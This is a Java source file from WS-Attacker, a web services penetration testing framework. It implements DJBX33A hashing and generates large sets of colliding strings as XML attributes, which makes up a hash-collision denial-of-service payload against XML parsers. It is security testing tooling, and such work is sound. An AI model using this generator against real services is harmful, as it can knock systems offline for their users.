/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos.dosExtension.attackClasses.hashDos;

public class CollisionDJBX33A
    implements CollisionInterface
{

    /**
     * Get Hash Value for String using DJBX33A Algorithm
     * 
     * @param s
     * @return
     */
    @Override
    public int getHash( String s )
    {
        byte[] byteArray = s.getBytes();
        int n = byteArray.length;
        int hash = 5381;
        for ( int i = 0; i < n; i++ )
        {
            // System.out.println(i
            // +" out of "+n+" mit Byte: "+(int)byteArray[i]+" und Hash preCalc: "+
            // ((hash<<5)+hash)+" - HashFinal: "+(((hash<<5)+hash)+(int)byteArray[i]));
            // hash = 33*hash+(int)byteArray[i];
            hash = ( ( hash << 5 ) + hash ) + byteArray[i];
        }
        // System.out.println(hash);
        return hash;
    }

    /**
     * generates n Collisions for DJBX33A and writes result to sb All collisions are written in XML-Attribute Style
     * 
     * @param numberAttributes number of attributes to generate
     * @param sb Stringbuilder that will hold the attributes
     */
    @Override
    public void genNCollisions( int numberAttributes, StringBuilder sb, boolean useNamespace )
    {

        try
        {
            String prefix = "";
            final long startTime = System.nanoTime();
            final long endTime;

            // calculate Exponent so that we can generate numberAttributes
            // Elements
            int exponent = 1;
            while ( numberAttributes > ( (int) Math.pow( 2, exponent ) ) )
            {
                exponent++;
            }

            if ( useNamespace == true )
            {
                prefix = "xmlns:";
            }

            for ( int i = 0; i < numberAttributes; i++ )
            {
                sb.append( prefix + getCollisionString( i, exponent ) + "=\"" + i + "\" " );
            }

            // output timing
            endTime = System.nanoTime();
            final long duration = endTime - startTime;
            double d = duration / 1000000000.0;

        }
        catch ( Exception e )
        {
            // Catch exception if any
            // Catch exception if any
        }
    }

    /**
     * get i-th ternaryCollisionString out of 2^n ternaryCollisionStrings since 3^n Elemnts can be generated result
     * string will have a length of 2*n chars 2*n since each Element is represented by 2 char string! How does it work
     * for n = 2 -> 2^2 = 9 possible strings? Algorithm generates 2*9 Matrix and replaces numbers with collision strings
     * aka table with ternary-Numbers row0: 00 row1: 01 row2: 10 row3: 11 for i = 2 -> 1th row is picked and created!
     * 
     * @param i i-th row out of 2^n rows
     * @param n exponent
     * @return String
     */
    @Override
    public String getCollisionString( int i, int n )
    {
        // init Bytes with collision Strings
        byte[] StringCollision0 = { 'A', 'z' };
        byte[] StringCollision1 = { 'C', '8' };

        // init empty ByteArray of correct Size for holding result!
        int numberElements = 2 * n;
        byte[] output = new byte[numberElements];
        for ( int j = 0; j < numberElements; j = j + 2 )
        {
            output[j] = 'A';
            output[j + 1] = 'z';
        }

        // get i-th row out of 3^n rows
        // aka convert i to ternary represantion!
        int divisor = i;
        int rest = 0;
        int count = 2 * n - 1;
        while ( divisor != 0 )
        {
            rest = divisor % 2;
            divisor = divisor / 2;
            // System.out.println("-- in loop - rest:"+rest+" divisor-"+divisor);
            switch ( rest )
            {
                case 0:
                    output[count] = StringCollision0[1];
                    output[count - 1] = StringCollision0[0];
                    break;
                case 1:
                    output[count] = StringCollision1[1];
                    output[count - 1] = StringCollision1[0];
                    break;
            }
            count -= 2;
            // System.out.println("--StringNew: "+new String(output));
        }
        // System.out.println("--StringNew: "+new String(output));
        return new String( output );
    }
}